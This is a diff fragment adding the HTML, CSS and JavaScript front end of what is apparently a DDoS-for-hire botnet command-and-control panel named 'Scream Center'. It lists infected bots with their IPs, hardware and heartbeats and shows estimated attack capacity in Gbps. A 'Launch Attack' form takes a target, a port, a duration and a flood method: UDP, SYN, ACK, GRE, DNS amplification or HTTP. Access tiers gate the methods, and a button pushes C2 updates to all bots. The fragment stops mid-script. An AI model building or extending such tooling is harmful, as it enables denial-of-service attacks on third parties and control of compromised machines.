+          to right,
+          transparent 0%,
+          rgba(0, 255, 157, 0.1) 50%,
+          transparent 100%
+        );
+      }
+
+      .modal-close-btn {
+        background: none;
+        border: none;
+        color: var(--dim);
+        cursor: pointer;
+        transition: color 0.2s;
+        padding: 0.25rem;
+      }
+
+      .modal-close-btn:hover {
+        color: var(--light);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .modal-content {
+        padding: 1.5rem;
+        max-height: 70vh;
+        overflow-y: auto;
+      }
+
+      .admin-tabs {
+        display: flex;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.2);
+        padding: 0 1.5rem;
+        background: linear-gradient(
+          to right,
+          transparent 0%,
+          rgba(0, 255, 157, 0.05) 50%,
+          transparent 100%
+        );
+      }
+
+      .tab-button {
+        padding: 1rem 1.5rem;
+        background: none;
+        border: none;
+        color: var(--dim);
+        cursor: pointer;
+        position: relative;
+        transition: all 0.2s;
+        font-family: 'Courier New', monospace;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+      }
+
+      .tab-button.active {
+        color: var(--primary);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .tab-button.active::after {
+        content: "";
+        position: absolute;
+        bottom: -1px;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background-color: var(--primary);
+        box-shadow: 0 0 5px var(--glow);
+      }
+
+      .tab-button:hover:not(.active) {
+        color: var(--light);
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .tab-content {
+        display: none;
+        padding: 1.5rem;
+      }
+
+      .tab-content.active {
+        display: block;
+      }
+
+      .user-management {
+        display: flex;
+        justify-content: flex-end;
+        margin-bottom: 1rem;
+      }
+
+      .users-table {
+        width: 100%;
+        border-collapse: collapse;
+      }
+
+      .users-table th,
+      .users-table td {
+        padding: 0.75rem 1rem;
+        text-align: left;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.1);
+      }
+
+      .users-table th {
+        background-color: rgba(0, 255, 157, 0.1);
+        color: var(--dim);
+        text-transform: uppercase;
+        font-size: 0.75rem;
+        letter-spacing: 0.05em;
+        font-family: 'Courier New', monospace;
+      }
+
+      .users-table tr:hover td {
+        background-color: rgba(0, 255, 157, 0.05);
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .command-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+        gap: 1rem;
+      }
+
+      .command-card.disabled {
+        opacity: 0.7;
+        filter: grayscale(0.7);
+      }
+
+      .cyber-badge-disabled {
+        background-color: #4b5563;
+        color: #9ca3af;
+        border: 1px solid #6b7280;
+      }
+
+      .command-card.disabled .cyber-btn {
+        background-color: #4b5563;
+        cursor: not-allowed;
+      }
+
+      .command-card {
+        padding: 1.5rem;
+        background-color: rgba(0, 255, 157, 0.05);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.5rem;
+        transition: all 0.3s ease;
+        font-family: 'Courier New', monospace;
+      }
+
+      .command-card:hover {
+        border-color: rgba(0, 255, 157, 0.4);
+        box-shadow: 0 0 20px rgba(0, 255, 157, 0.1);
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .command-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 1rem;
+      }
+
+      .command-header h3 {
+        font-size: 1.125rem;
+        font-weight: 600;
+      }
+
+      .command-params {
+        margin: 1rem 0;
+      }
+
+      .command-params label {
+        display: block;
+        margin-bottom: 0.5rem;
+        font-size: 0.875rem;
+        color: var(--dim);
+      }
+
+      .command-params input {
+        width: 100%;
+      }
+
+      /* ==================== */
+      /* BOT DETAILS          */
+      /* ==================== */
+      .bot-details {
+        padding: 1.5rem;
+      }
+
+      .detail-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+        gap: 1rem;
+        margin: 1.5rem 0;
+      }
+
+      .detail-row {
+        display: flex;
+        justify-content: space-between;
+        padding: 0.75rem 0;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.1);
+      }
+
+      .detail-label {
+        color: var(--dim);
+        font-size: 0.875rem;
+        font-family: 'Courier New', monospace;
+      }
+
+      .detail-value {
+        font-family: 'Courier New', monospace;
+        font-size: 0.875rem;
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .bot-actions {
+        display: flex;
+        gap: 0.75rem;
+        margin-top: 1.5rem;
+      }
+
+      /* ==================== */
+      /* ANIMATIONS           */
+      /* ==================== */
+      .animate-fade-in {
+        animation: fadeIn 0.5s ease-out forwards;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* ==================== */
+      /* NO SCROLL            */
+      /* ==================== */
+      .no-scroll {
+        overflow: hidden;
+      }
+
+      /* ==================== */
+      /* RESPONSIVE           */
+      /* ==================== */
+      @media (max-width: 768px) {
+        .dashboard-header {
+          padding: 1rem;
+          flex-direction: column;
+          gap: 1rem;
+        }
+
+        .header-controls {
+          width: 100%;
+          justify-content: space-between;
+        }
+
+        .metrics-grid {
+          grid-template-columns: 1fr;
+          padding: 1rem;
+        }
+
+        .dashboard-main {
+          padding: 0 1rem 1rem;
+          grid-template-columns: 1fr;
+        }
+
+        .modal {
+          max-width: 100%;
+          margin: 1rem;
+        }
+
+        .admin-tabs {
+          flex-wrap: wrap;
+        }
+
+        .tab-button {
+          padding: 0.75rem 1rem;
+          font-size: 0.875rem;
+        }
+        
+        .command-grid {
+          grid-template-columns: 1fr;
+        }
+      }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col terminal-effect">
+    <header class="dashboard-header">
+        <div class="logo-container">
+            <div class="logo-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path>
+                </svg>
+            </div>
+            <h1 class="cyber-title">
+                <span class="text-primary">Scream</span>
+                <span class="text-dim">Center</span>
+            </h1>
+        </div>
+        <div class="header-controls">
+            <div class="connection-status">
+                <span id="connection-status" class="status-indicator status-active" title="Connected"></span>
+                <span id="connection-text" class="connection-text">Connected</span>
+                <span id="rate-limit-indicator" class="rate-limit-indicator rate-ok">
+                    <i class="fas fa-check-circle"></i> Ready
+                </span>
+            </div>
+            <div class="profile-dropdown-container">
+                <button id="profile-button" class="profile-button">
+                    <span class="text-sm font-medium text-primary">&#128100; {{.User.Username}}</span>
+                    <span class="cyber-badge {{if eq .User.Level "Owner"}}cyber-badge-owner{{else if eq .User.Level "Admin"}}cyber-badge-admin{{else if eq .User.Level "Pro"}}cyber-badge-stealth{{else if eq .User.Level "Basic"}}cyber-badge-maintenance{{else}}cyber-badge-user{{end}}"> {{.User.Level}} &#9881;&#65039; </span>
+                    <i class="fas fa-chevron-down text-xs text-dim"></i>
+                </button>
+                <div id="profile-dropdown" class="cyber-dropdown hidden">
+                    <div class="profile-info">
+                        <p class="text-sm font-medium text-primary">&#128101; {{.User.Username}}</p>
+                        <p class="text-xs cyber-subtitle mt-1">{{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}{{end}}</p>
+                    </div>
+                    <div class="dropdown-actions">
+                        {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+                        <button id="admin-console-btn" class="cyber-dropdown-item">
+                            <i class="fas fa-user-shield mr-2 text-primary"></i> Admin Console
+                        </button>
+                        {{end}}
+                        <a href="/logout" class="cyber-dropdown-item">
+                            <i class="fas fa-sign-out-alt mr-2 text-dim"></i> Terminate Session
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    {{if .FlashMessage}}
+    <div class="cyber-flash">
+        <span class="font-mono">{{.FlashMessage}}</span>
+        <button onclick="this.parentElement.remove()" class="cyber-flash-btn">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+    {{end}}
+
+    <div class="metrics-grid">
+        {{if or (eq .User.Level "Owner") (eq .User.Level "Admin")}}
+        <div class="cyber-panel">
+            <div class="metric-header">
+                <p class="cyber-metric-label">&#128187; Connected Bots</p>
+                <div class="metric-icon">
+                    <i class="fas fa-robot text-primary"></i>
+                </div>
+            </div>
+            <p class="cyber-metric bot-count-metric">{{.BotCount}}</p>
+        </div>
+        {{end}}
+
+        <div class="cyber-panel">
+            <div class="metric-header">
+                <p class="cyber-metric-label">&#128737;&#65039; Active Attacks</p>
+                <div class="metric-icon">
+                    <i class="fas fa-bolt text-accent"></i>
+                </div>
+            </div>
+            <p class="cyber-metric attack-count-metric">{{len .OngoingAttacks}}/{{GetMaxConcurrentAttacks .User.Level}}</p>
+        </div>
+        
+        <div class="cyber-panel">
+            <div class="metric-header">
+                <p class="cyber-metric-label">&#9876;&#65039; Attack Power Estimated Capacity</p>
+                <div class="metric-icon">
+                    <i class="fas fa-bolt text-secondary"></i>
+                </div>
+            </div>
+            <p class="cyber-metric">{{printf "%.2f" (getAttackPower .Bots)}} Gbps</p>
+        </div>
+    </div>
+
+    <main class="dashboard-main">
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.3s">
+            <div class="panel-header">
+                <h2 class="cyber-title">
+                    <span class="status-indicator"></span> &#128225; Active Engagements
+                </h2>
+                <div id="attacks-loading" class="hidden">
+                    <i class="fas fa-sync-alt fa-spin text-primary"></i>
+                </div>
+                {{if .OngoingAttacks}}
+                <button onclick="stopAllAttacks()" class="cyber-btn">
+                    <i class="fas fa-stop-circle"></i>
+                    <span>Stop All</span>
+                </button>
+                {{end}}
+            </div>
+            <div class="custom-scrollbar">
+                <table class="cyber-table">
+                    <thead>
+                        <tr>
+                            <th>Protocol</th>
+                            <th>Target</th>
+                            <th>Duration</th>
+                            <th>Remaining</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="attacks-table">
+                        {{if .OngoingAttacks}}
+                        {{range .OngoingAttacks}}
+                        <tr>
+                            <td>
+                                <span class="attack-method-badge">
+                                    {{FormatMethodIcon .Method }} {{FormatAttackMethodName .Method}}
+                                </span>
+                            </td>
+                            <td class="font-mono text-primary">{{.Target}}:{{.Port}}</td>
+                            <td class="text-primary">{{.Duration}}</td>
+                            <td class="text-primary">{{.Remaining}}</td>
+                            <td>
+                                <a href="/stop-attack?id={{.ID}}" class="attack-stop-btn">
+                                    <i class="fas fa-stop mr-1"></i> Terminate
+                                </a>
+                            </td>
+                        </tr>
+                        {{end}}
+                        {{else}}
+                        <tr>
+                            <td colspan="5" class="text-center text-dim font-mono">No active engagements</td>
+                        </tr>
+                        {{end}}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.2s">
+            <div class="panel-header">
+                <h2 class="cyber-title">
+                    <span class="status-indicator"></span> &#9876;&#65039; Attack Vector
+                </h2>
+            </div>
+            <form action="/attack" method="POST" autocomplete="off" class="attack-form" id="attack-form">
+                <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+                <div class="form-group">
+                    <label for="ip" class="cyber-metric-label">
+                        <i class="fas fa-globe text-secondary"></i> Target IP/Domain
+                    </label>
+                    <input type="text" id="ip" name="ip" required placeholder="example.com or 1.1.1.1" class="cyber-input" pattern="^([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+|(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$">
+                    <div class="validation-error" id="ip-error"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="port" class="cyber-metric-label">
+                        <i class="fas fa-plug text-secondary"></i> Target Port
+                    </label>
+                    <input type="number" id="port" name="port" required placeholder="80" min="1" max="65535" class="cyber-input">
+                    <div class="validation-error" id="port-error"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="method" class="cyber-metric-label">
+                        <i class="fas fa-bolt text-secondary"></i> Attack Method
+                    </label>
+                    <select id="method" name="method" required class="cyber-select">
+                        <option value="" disabled selected>Select method</option>
+                        <option value="!udpflood">UDP Flood</option>
+                        <option value="!udpsmart">UDP Smart</option>
+                        <option value="!tcpflood">TCP Flood</option>
+                        <option value="!synflood">SYN Flood</option>
+                        <option value="!ackflood">ACK Flood</option>
+                        <option value="!greflood">GRE Flood</option>
+                        <option value="!dns">DNS Amplification</option>
+                        <option value="!http">HTTP Flood</option>
+                    </select>
+                    <div class="validation-error" id="method-error"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="duration" class="cyber-metric-label">
+                        <i class="fas fa-clock text-secondary"></i> Duration (seconds)
+                    </label>
+                    <input type="number" id="duration" name="duration" required placeholder="60" min="10" max="{{GetMaxAttackDuration .User.Level}}" class="cyber-input">
+                    <div class="duration-limits">
+                        <span>Min: 10s</span>
+                        <span>Max: {{GetMaxAttackDuration .User.Level}}s</span>
+                    </div>
+                    <div class="validation-error" id="duration-error"></div>
+                </div>
+                
+                <div class="form-footer">
+                    <button type="submit" class="cyber-btn attack-submit-btn" id="attack-submit" disabled>
+                        <i class="fas fa-rocket mr-2"></i> Launch Attack
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <div class="cyber-panel animate-fade-in" style="animation-delay: 0.4s">
+            <div class="panel-header">
+                <h2 class="cyber-title">
+                    <span class="status-indicator"></span>  &#128187; Bot Network
+                </h2>
+                <button onclick="refreshBotList()" class="cyber-btn">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+            <div class="bot-network-container">
+                <table class="cyber-table">
+                  <thead class="bot-table-header">
+                      <tr>
+                          <th>Status</th>
+                          <th>IP Address</th>
+                          <th>Architecture</th>
+                          <th>CPU Cores</th>
+                          <th>RAM</th>
+                          <th>Location</th>
+                          <th>Last Heartbeat</th>
+                      </tr>
+                  </thead>
+                  <tbody class="bot-table-body" id="bots-table">
+                      {{range .Bots}}
+                      <tr class="bot-row" data-bot='{{json .}}'>
+                          <td>
+                              {{if isActive .LastHeartbeat}}
+                              <span class="status-indicator status-active"></span> Active
+                              {{else}}
+                              <span class="status-indicator status-inactive"></span> Inactive
+                              {{end}}
+                          </td>
+                          <td class="font-mono text-primary">{{.IP}}</td>
+                          <td class="text-primary">{{.Arch}}</td>
+                          <td class="text-primary">{{.Cores}}</td>
+                          <td class="text-primary">
+                              {{if gt .RAM 0}}
+                              {{printf "%.1f GB" .RAM}}
+                              {{else}}
+                              N/A
+                              {{end}}
+                          </td>
+                          <td class="text-primary">Unknown</td>
+                          <td class="text-primary">{{.LastHeartbeat.Format "2006-01-02 15:04:05"}}</td>
+                      </tr>
+                      {{end}}
+                  </tbody>
+              </table>
+            </div>
+        </div>
+    </main>
+
+    <!-- Admin Overlay -->
+    <div id="admin-overlay" class="overlay hidden">
+        <div class="modal admin-modal">
+            <div class="modal-header">
+                <h2 class="cyber-title">
+                    <i class="fas fa-user-shield text-primary"></i> Admin Console
+                </h2>
+                <button onclick="hideAdminPanel()" class="modal-close-btn">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="admin-tabs">
+                <button id="users-tab" class="tab-button active" data-tab="users" onclick="switchTab('users')">
+                    <i class="fas fa-users mr-2"></i> User Management
+                </button>
+                <button id="commands-tab" class="tab-button" data-tab="commands" onclick="switchTab('commands')">
+                    <i class="fas fa-terminal mr-2"></i> Bot Commands
+                </button>
+                {{if eq .User.Level "Owner"}}
+                <button id="settings-tab" class="tab-button" data-tab="settings" onclick="switchTab('settings')">
+                    <i class="fas fa-cog mr-2"></i> System Settings
+                </button>
+                {{end}}
+            </div>
+
+            <div id="users-content" class="tab-content active">
+                <div class="user-management">
+                    <button onclick="showAddUserForm()" class="cyber-btn">
+                        <i class="fas fa-user-plus"></i>
+                        <span>Create New User</span>
+                    </button>
+                </div>
+                <div id="add-user-form" class="hidden cyber-panel mt-4">
+                    <div class="panel-header">
+                        <h3 class="cyber-title">
+                            <i class="fas fa-user-plus text-primary"></i> Create New User
+                        </h3>
+                        <button onclick="hideAddUserForm()" class="modal-close-btn">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    <form action="/add-user" method="POST" autocomplete="off" class="user-form" id="user-form">
+                        <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+                        <div class="form-group">
+                            <label for="new-username" class="cyber-metric-label">
+                                <i class="fas fa-user-tag text-secondary"></i> Username
+                            </label>
+                            <input type="text" id="new-username" name="username" required placeholder="hacker1337" maxlength="32" pattern="^[a-zA-Z0-9_]+$" title="Only letters, numbers and underscores allowed" class="cyber-input">
+                            <p class="text-xs text-dim">Only letters, numbers and underscores allowed</p>
+                            <div class="validation-error" id="username-error"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="new-password" class="cyber-metric-label">
+                                <i class="fas fa-key text-secondary"></i> Password
+                            </label>
+                            <div class="password-input">
+                                <input type="password" id="new-password" name="password" required placeholder="••••••••••••" autocomplete="new-password" class="cyber-input">
+                                <button type="button" onclick="togglePasswordVisibility('new-password')" class="password-toggle">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                            <div class="password-requirements">
+                                <div>
+                                    <i class="fas fa-check-circle" id="length-check"></i>
+                                    <span>Minimum 12 characters</span>
+                                </div>
+                                <div>
+                                    <i class="fas fa-check-circle" id="case-check"></i>
+                                    <span>Uppercase & lowercase</span>
+                                </div>
+                                <div>
+                                    <i class="fas fa-check-circle" id="number-check"></i>
+                                    <span>At least one number</span>
+                                </div>
+                                <div>
+                                    <i class="fas fa-check-circle" id="special-check"></i>
+                                    <span>Special character</span>
+                                </div>
+                            </div>
+                            <div class="validation-error" id="password-error"></div>
+                        </div>
+                        <div class="form-group">
+                            <label for="level" class="cyber-metric-label">
+                                <i class="fas fa-shield-alt text-secondary"></i> Access Level
+                            </label>
+                            <select id="level" name="level" required class="cyber-select">
+                                {{if eq .User.Level "Owner"}}
+                                <option value="Owner">Owner</option>
+                                {{end}}
+                                <option value="Admin">Admin</option>
+                                <option value="Pro">Pro</option>
+                                <option value="Basic">Basic</option>
+                                <option value="User">User</option>
+                            </select>
+                            <p class="text-xs text-dim">Owners have full system control</p>
+                        </div>
+                        <div class="form-group">
+                            <label for="expiry" class="cyber-metric-label">
+                                <i class="fas fa-calendar-times text-secondary"></i> Expiration Date (Optional)
+                            </label>
+                            <div class="date-input">
+                                <input type="date" id="expiry" name="expiry" class="cyber-input date-picker" min="{{ now.Format "2006-01-02" }}">
+                                <i class="fas fa-calendar-alt"></i>
+                            </div>
+                            <p class="text-xs text-dim">Leave blank for no expiration</p>
+                        </div>
+                        <div class="form-actions">
+                            <button type="submit" class="cyber-btn" id="user-submit">
+                                <i class="fas fa-user-plus"></i>
+                                <span>Create User</span>
+                            </button>
+                            <button type="button" onclick="hideAddUserForm()" class="cancel-btn">
+                                <i class="fas fa-ban"></i>
+                                <span>Cancel</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+                <div class="users-table mt-4">
+                    <table class="cyber-table">
+                        <thead>
+                            <tr>
+                                <th>Username</th>
+                                <th>Level</th>
+                                <th>Expires</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {{range .Users}}
+                            <tr>
+                                <td class="text-primary">{{.Username}}</td>
+                                <td>
+                                    {{if eq .Level "Owner"}}
+                                    <span class="cyber-badge cyber-badge-owner">Owner</span>
+                                    {{else if eq .Level "Admin"}}
+                                    <span class="cyber-badge cyber-badge-admin">Admin</span>
+                                    {{else if eq .Level "Pro"}}
+                                    <span class="cyber-badge cyber-badge-pro">Pro</span>
+                                    {{else if eq .Level "Basic"}}
+                                    <span class="cyber-badge cyber-badge-basic">Basic</span>
+                                    {{else}}
+                                    <span class="cyber-badge cyber-badge-user">User</span>
+                                    {{end}}
+                                </td>
+                                <td class="text-primary">{{.Expire.Format "2006-01-02"}}</td>
+                                <td>
+                                    <form action="/delete-user" method="get" class="inline">
+                                        <input type="hidden" name="csrf_token" value="{{$.CSRFToken}}">
+                                        <input type="hidden" name="username" value="{{.Username}}">
+                                        <button type="submit" class="delete-btn" {{if eq .Username $.User.Username}}disabled{{end}}>
+                                            <i class="fas fa-trash-alt mr-1"></i> Delete
+                                        </button>
+                                    </form>
+                                </td>
+                            </tr>
+                            {{end}}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div id="commands-content" class="tab-content">
+                <div class="command-grid">
+                    <div class="command-card">
+                        <div class="command-header">
+                            <h3 class="text-primary">
+                                <i class="fas fa-sync-alt"></i> Update Bots
+                            </h3>
+                            <span class="cyber-badge cyber-badge-maintenance">MAINTENANCE</span>
+                        </div>
+                        <p class="text-dim">Force all bots to update from C2 server</p>
+                        <button onclick="sendBotCommand('UPDATE')" class="cyber-btn">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Push Update
+                        </button>
+                    </div>
+                    <div class="command-card disabled">
+                        <div class="command-header">
+                            <h3 class="text-dim">
+                                <i class="fas fa-skull"></i> Kill Switch
+                            </h3>
+                            <span class="cyber-badge cyber-badge-disabled">DISABLED</span>
+                        </div>
+                        <p class="text-dim">This feature has been disabled for security reasons</p>
+                        <button class="cyber-btn" disabled>
+                            <i class="fas fa-ban mr-2"></i> Disabled
+                        </button>
+                    </div>
+                    <div class="command-card disabled">
+                        <div class="command-header">
+                            <h3 class="text-dim">
+                                <i class="fas fa-lock"></i> File Locker
+                            </h3>
+                            <span class="cyber-badge cyber-badge-disabled">DISABLED</span>
+                        </div>
+                        <p class="text-dim">This feature has been disabled for security reasons</p>
+                        <button class="cyber-btn" disabled>
+                            <i class="fas fa-ban mr-2"></i> Disabled
+                        </button>
+                    </div>
+                    <div class="command-card disabled">
+                        <div class="command-header">
+                            <h3 class="text-dim">
+                                <i class="fas fa-infinity"></i> Persistence
+                            </h3>
+                            <span class="cyber-badge cyber-badge-disabled">DISABLED</span>
+                        </div>
+                        <p class="text-dim">This feature has been disabled for security reasons</p>
+                        <button class="cyber-btn" disabled>
+                            <i class="fas fa-ban mr-2"></i> Disabled
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            {{if eq .User.Level "Owner"}}
+            <div id="settings-content" class="tab-content">
+                <div class="settings-form">
+                    <form action="/update-settings" method="POST" id="settings-form">
+                        <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
+                        <div class="form-group">
+                            <label for="max-attack-duration" class="cyber-metric-label">
+                                <i class="fas fa-clock text-secondary"></i> Maximum Attack Duration (seconds)
+                            </label>
+                            <input type="number" id="max-attack-duration" name="max_attack_duration" class="cyber-input" min="60" max="86400" value="3600">
+                        </div>
+                        <div class="form-group">
+                            <label for="heartbeat-interval" class="cyber-metric-label">
+                                <i class="fas fa-heartbeat text-secondary"></i> Heartbeat Interval (seconds)
+                            </label>
+                            <input type="number" id="heartbeat-interval" name="heartbeat_interval" class="cyber-input" min="10" max="600" value="30">
+                        </div>
+                        <div class="form-actions">
+                            <button type="submit" class="cyber-btn">
+                                <i class="fas fa-save mr-2"></i> Save Settings
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            {{end}}
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+<script>
+/**
+ * Dashboard State Manager - Complete Implementation
+ */
+ class DashboardState {
+    constructor() {
+        // Connection management
+        this.sse = null;
+        this.reconnectAttempts = 0;
+        this.maxReconnectAttempts = 10;
+        this.reconnectDelayBase = 1000;
+        this.isManualClose = false;
+        this.lastBotsData = null;
+        this.csrfToken = document.querySelector('meta[name="csrf-token"]').content;
+
+        // State management
+        this.isInitialized = false;
+        this.lastData = null;
+        this.activeModal = null;
+        this.pendingRequests = new Map();
+        this.eventListeners = new Map();
+        this.userLevel = 'User'; // Default level
+        this.csrfToken = '';
+        this.adminConsoleBtn = null;
+        this.commandWhitelist = {
+            Owner: ['!udpflood', '!udpsmart', '!tcpflood', '!synflood', '!ackflood', '!greflood', '!dns', '!http', 'STOP', 'UPDATE'],
+            Admin: ['!udpflood', '!udpsmart', '!tcpflood', '!synflood', '!ackflood', '!greflood', '!dns', '!http', 'STOP'],
+            Pro: ['!udpflood', '!tcpflood', '!synflood', '!ackflood', 'STOP'],
+            Basic: ['!udpflood', '!tcpflood', 'STOP']
+        };
+        this.rateLimitState = {
+            lastAttack: null,
+            attackCount: 0,
+            rateLimited: false
+        };
+
+        // DOM elements cache
+        this.domElements = {
+            attackCost: document.getElementById('attack-cost'),
+            methodSelect: document.getElementById('method'),
+            durationInput: document.getElementById('duration'),
+            attackForm: document.querySelector('form[action="/attack"]'),
+            attacksTable: document.getElementById('attacks-table'),
+            botsTable: document.querySelector('.bot-table-body'),
+            profileButton: document.getElementById('profile-button'),
+            profileDropdown: document.getElementById('profile-dropdown'),
+            adminConsoleBtn: document.getElementById('admin-console-btn'),
+            adminPanel: document.getElementById('admin-overlay'),
+            addUserForm: document.getElementById('add-user-form'),
+            usersTab: document.getElementById('users-content'),
+            commandsTab: document.getElementById('commands-content'),
+            rateLimitIndicator: document.getElementById('rate-limit-indicator')
+        };
+
+        // Initialize password requirement checks
+        this.passwordChecks = {
+            length: document.getElementById('length-check'),
+            case: document.getElementById('case-check'),
+            number: document.getElementById('number-check'),
+            special: document.getElementById('special-check')
+        };
+    }
+
+    // Initialization
+    async init() {
+        if (this.isInitialized) return;
+
+        try {
+            // Get CSRF token from meta tag
+            const csrfMeta = document.querySelector('meta[name="csrf-token"]');
+            this.csrfToken = csrfMeta ? csrfMeta.content : '';
+
+            await this.loadUserData();
+            await this.waitForElement('#admin-console-btn');
+            this.setupAdminConsoleButton();
+            this.setupSSE();
+            this.setupEventListeners();
+            this.setupPasswordValidation();
+            this.setupRateLimitMonitoring();
+            this.isInitialized = true;
+            
+            // Initialize tabs
+            this.switchTab('users');
+            
+        } catch (error) {
+            console.error('Dashboard initialization failed:', error);
+            this.showFlashMessage('Failed to initialize dashboard. Please refresh the page.', 'error');
+            this.cleanup();
+        }
+    }
+
+    waitForElement(selector) {
+        return new Promise(resolve => {
+            if (document.querySelector(selector)) {
+                return resolve(document.querySelector(selector));
+            }
+
+            const observer = new MutationObserver(() => {
+                if (document.querySelector(selector)) {
+                    observer.disconnect();
+                    resolve(document.querySelector(selector));
+                }
+            });
+
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true
+            });
+        });
+    }
+
+    setupAdminConsoleButton() {
+        this.adminConsoleBtn = document.getElementById('admin-console-btn');
+        if (!this.adminConsoleBtn) {
+            console.error('Admin console button not found!');
+            return;
+        }
+
+        this.adminConsoleBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            this.showAdminPanel();
+            
+            // Close profile dropdown if open
+            if (this.domElements.profileDropdown) {
+                this.domElements.profileDropdown.classList.add('hidden');
+            }
+        });
+    }
+
+    setupRateLimitMonitoring() {
+        setInterval(() => {
+            if (this.rateLimitState.rateLimited) {
+                const now = new Date();
+                const lastAttackTime = this.rateLimitState.lastAttack ? new Date(this.rateLimitState.lastAttack) : null;
+                
+                if (lastAttackTime && (now - lastAttackTime) > 30000) { // 30 second cooldown
+                    this.rateLimitState.rateLimited = false;
+                    this.rateLimitState.attackCount = 0;
+                    this.updateRateLimitUI(false);
+                }
+            }
+        }, 5000);
+    }
+
+    
+
+    updateRateLimitUI(isLimited) {
+        const indicator = this.domElements.rateLimitIndicator;
+        if (!indicator) return;
+        
+        if (isLimited) {
+            indicator.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Rate Limited';
+            indicator.className = 'rate-limit-indicator rate-limited';
+        } else {
+            indicator.innerHTML = '<i class="fas fa-check-circle"></i> Ready';
+            indicator.className = 'rate-limit-indicator rate-ok';
+        }
+    }
+
+    // User Data Management
+    async loadUserData() {
+        const requestId = Date.now();
+        const controller = new AbortController();
+        this.pendingRequests.set(requestId, controller);
+
+        try {
+            const response = await fetch('/api/user-data', {
+                credentials: 'include',
+                signal: controller.signal,
+                headers: {
+                    'X-CSRF-Token': this.csrfToken
+                }
+            });
+
+            this.pendingRequests.delete(requestId);
+
+            if (!response.ok) {
+                const error = await response.json().catch(() => ({}));
+                throw new Error(error.message || 'Failed to load data');
+            }
+
+            const userData = await response.json();
+            this.userLevel = userData.user?.Level || 'User';
+            this.updateUserLevelDisplay(userData.user);
+            return userData;
+        } catch (error) {
+            this.pendingRequests.delete(requestId);
+            
+            if (error.name !== 'AbortError') {
+                const message = error.message.includes('Unauthorized') 
+                    ? 'Session expired - please login again'
+                    : 'Failed to load dashboard data. Please try again.';
+                
+                this.showFlashMessage(message, 'error');
+                
+                if (error.message.includes('Unauthorized')) {
+                    setTimeout(() => {
+                        window.location.href = '/';
+                    }, 2000);
+                }
+            }
+            throw error;
+        }
+    }
+
+    // SSE Connection Management
+    setupSSE() {
+        if (this.isManualClose) return;
+    
+        // Clear existing connection if any
+        if (this.sse) {
+            this.sse.close();
+            this.sse = null;
+        }
+    
+        const url = new URL('/sse', window.location.origin);
+        this.sse = new EventSource(url.toString(), {
+            withCredentials: true
+        });
+    
+        // Connection established
+        this.sse.onopen = () => {
+            console.log('SSE connection established');
+            this.reconnectAttempts = 0;
+            this.updateConnectionStatus(true);
+            
+            // Request fresh data on reconnect
+            this.loadUserData().catch(console.error);
+        };
+    
+        // Connection error
+        this.sse.onerror = (error) => {
+            console.error('SSE connection error:', error);
+            this.updateConnectionStatus(false);
+            
+            // Don't immediately close - let it attempt to reconnect
+            if (this.sse.readyState === EventSource.CLOSED) {
+                this.scheduleReconnect();
+            }
+        };
+    
+        // Message handler
+        const handleMessage = (event) => {
+            if (event.data.trim() === ': heartbeat') return;
+            
+            try {
+                const data = JSON.parse(event.data);
+                this.lastData = data;
+                
